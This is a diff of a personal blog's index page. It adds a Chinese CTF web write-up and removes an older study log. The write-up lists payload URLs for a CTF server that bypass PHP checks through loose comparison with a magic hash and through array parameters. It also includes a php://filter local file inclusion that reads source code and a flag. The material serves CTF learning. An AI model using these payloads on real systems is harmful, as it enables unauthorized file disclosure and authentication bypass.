@@ -232,6 +232,131 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/22/postweb-题解-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Conlonial">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Conlonial's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/22/postweb-题解-1/" itemprop="url">web 题解(1)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T20:20:27+08:00">
+                2019-07-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="web-题解"><a href="#web-题解" class="headerlink" title="web 题解 "></a><center>web 题解 </center></h1><h2 id="basic-php"><a href="#basic-php" class="headerlink" title="basic php"></a>basic php</h2><h5 id="参考"><a href="#参考" class="headerlink" title="参考:"></a><p align="left">参考:</p></h5><p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<h5 id="playload1（参考23）-http-123-207-149-64-23331-feature-name-1-amp-password-1-amp-test-QNKCDZO"><a href="#playload1（参考23）-http-123-207-149-64-23331-feature-name-1-amp-password-1-amp-test-QNKCDZO" class="headerlink" title="playload1（参考23）:http://123.207.149.64:23331/feature/?name=1&amp;password=1&amp;test=QNKCDZO"></a><p align="left">playload1（参考23）:</p><code>http://123.207.149.64:23331/feature/?name=1&amp;password=1&amp;test=QNKCDZO</code></h5><h3 id="另：不赋值的方法本题不使用，具体原因待测"><a href="#另：不赋值的方法本题不使用，具体原因待测" class="headerlink" title="另：不赋值的方法本题不使用，具体原因待测"></a>另：不赋值的方法本题不使用，具体原因待测</h3><h5 id="playload2（参考07）-http-123-207-149-64-23331-feature-name-1-amp-password-2-amp-test-QNKCDZO"><a href="#playload2（参考07）-http-123-207-149-64-23331-feature-name-1-amp-password-2-amp-test-QNKCDZO" class="headerlink" title="playload2（参考07）:http://123.207.149.64:23331/feature/?name[]=1&amp;password[]=2&amp;test=QNKCDZO"></a><p align="left">playload2（参考07）:</p><code>http://123.207.149.64:23331/feature/?name[]=1&amp;password[]=2&amp;test=QNKCDZO</code></h5><h3 id="Hint：由于sha1-函数和md5-函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过if-GET-39-name-39-GET-39-password-39-和else-if-sha1-GET-39-name-39-sha1-GET-39-password-39-检测。"><a href="#Hint：由于sha1-函数和md5-函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过if-GET-39-name-39-GET-39-password-39-和else-if-sha1-GET-39-name-39-sha1-GET-39-password-39-检测。" class="headerlink" title="Hint：由于sha1()函数和md5()函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])和else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))检测。"></a>Hint：由于sha1()函数和md5()函数在处理传入参数为数组时会报警并都返回NULL，构造并传入2个不同数组便可以成功通过<code>if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])</code>和<code>else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))</code>检测。</h3><h2 id="basic-php2"><a href="#basic-php2" class="headerlink" title="basic php2"></a>basic php2</h2><h5 id="参考-https-www-bodkin-ren-index-php-archives-168-ereg-和strpos-部分例子"><a href="#参考-https-www-bodkin-ren-index-php-archives-168-ereg-和strpos-部分例子" class="headerlink" title="参考:https://www.bodkin.ren/index.php/archives/168/  ereg()和strpos()部分例子"></a><p align="left">参考:</p><a href="https://www.bodkin.ren/index.php/archives/168/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/168/</a>  ereg()和strpos()部分例子</h5><h5 id="1-is-int-函数用于检测变量是否是整数。"><a href="#1-is-int-函数用于检测变量是否是整数。" class="headerlink" title="1. is_int() 函数用于检测变量是否是整数。"></a>1. is_int() 函数用于检测变量是否是整数。</h5><h5 id="2-strpos-函数：查找字符串在另一字符串中第一次出现的位置。"><a href="#2-strpos-函数：查找字符串在另一字符串中第一次出现的位置。" class="headerlink" title="2. strpos() 函数：查找字符串在另一字符串中第一次出现的位置。"></a>2. strpos() 函数：查找字符串在另一字符串中第一次出现的位置。</h5><h3 id="Hint-strpos-函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；"><a href="#Hint-strpos-函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；" class="headerlink" title="Hint: strpos() 函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；"></a><p align="left">Hint:</p> strpos() 函数对大小写敏感。与ereg（）两个函数都是处理字符串的函数；这时就可以利用数组来绕过；</h3><h5 id="playload-http-123-207-149-64-23360-user-27416cf22fc4ed74b1cd264585053b57fed14088-index-php-content-php"><a href="#playload-http-123-207-149-64-23360-user-27416cf22fc4ed74b1cd264585053b57fed14088-index-php-content-php" class="headerlink" title="playload: http://123.207.149.64:23360/user/27416cf22fc4ed74b1cd264585053b57fed14088/index.php?content[]=php"></a>playload: <code>http://123.207.149.64:23360/user/27416cf22fc4ed74b1cd264585053b57fed14088/index.php?content[]=php</code></h5><h2 id="Basicfileinclude"><a href="#Basicfileinclude" class="headerlink" title="Basicfileinclude"></a>Basicfileinclude</h2><h5 id="参考-1"><a href="#参考-1" class="headerlink" title="参考:"></a><p align="left">参考:</p></h5><pre><code>1. 白帽子php文件包含漏洞部分；
+2. http://mang0.me/archis/844a29d4/
+3. https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/ 
+4. https://xz.aliyun.com/t/3085
+</code></pre><h5 id="由上述可知关键在-php-filter-可以读取本地文件，而-index-php-file-php-filter-read-convert-base64-encode-resource-index-php"><a href="#由上述可知关键在-php-filter-可以读取本地文件，而-index-php-file-php-filter-read-convert-base64-encode-resource-index-php" class="headerlink" title="由上述可知关键在 php://filter 可以读取本地文件，而 index.php?file=php://filter/read=convert.base64-encode/resource=index.php"></a>由上述可知关键在 <code>php://filter</code> 可以读取本地文件，而 <code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></h5><p>指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</p>
+<h5 id="playload-http-123-207-149-64-23338-page-php-filter-read-convert-base64-encode-resource-flag"><a href="#playload-http-123-207-149-64-23338-page-php-filter-read-convert-base64-encode-resource-flag" class="headerlink" title="playload:http://123.207.149.64:23338/?page=php://filter/read=convert.base64-encode/resource=flag"></a><p align="left">playload:</p><code>http://123.207.149.64:23338/?page=php://filter/read=convert.base64-encode/resource=flag</code></h5><h5 id="ubuntu-base64解码指令：-echo-aGEgaGE-IHlvdSB3YW50IGZsYWc-IGZsYWcgaXMgaGVyZTw-cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8-LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo-base64-decode"><a href="#ubuntu-base64解码指令：-echo-aGEgaGE-IHlvdSB3YW50IGZsYWc-IGZsYWcgaXMgaGVyZTw-cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8-LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo-base64-decode" class="headerlink" title="ubuntu base64解码指令： echo aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo= | base64 --decode"></a><p align="left">ubuntu base64解码指令：</p> <code>echo aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo= | base64 --decode</code></h5>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/02/20100502进度/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1333,125 +1458,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/13/20190913进度/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Conlonial">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Conlonial's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/13/20190913进度/" itemprop="url">20190913进度</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-13T19:12:59+08:00">
-                2019-04-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="今天阅读到了1-4章，了解计算机硬件框架的发展，重点了解了采用PCI-ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程"><a href="#今天阅读到了1-4章，了解计算机硬件框架的发展，重点了解了采用PCI-ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程" class="headerlink" title="今天阅读到了1.4章，了解计算机硬件框架的发展，重点了解了采用PCI/ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程"></a>今天阅读到了1.4章，了解计算机硬件框架的发展，重点了解了采用PCI/ISA及南北桥设计的框架；人们为提高CPU速度采取的多核，SMP技术。操作系统硬件驱动和文件read过程</h2><h2 id="python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。"><a href="#python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。" class="headerlink" title="python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。"></a>python随mooc安排，利用交互式和文本式编写了求圆面积、绘同心圆、五角星的程序，初步了解了python语言特点。详细学习第一个实例：温度转换。</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1502,7 +1508,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
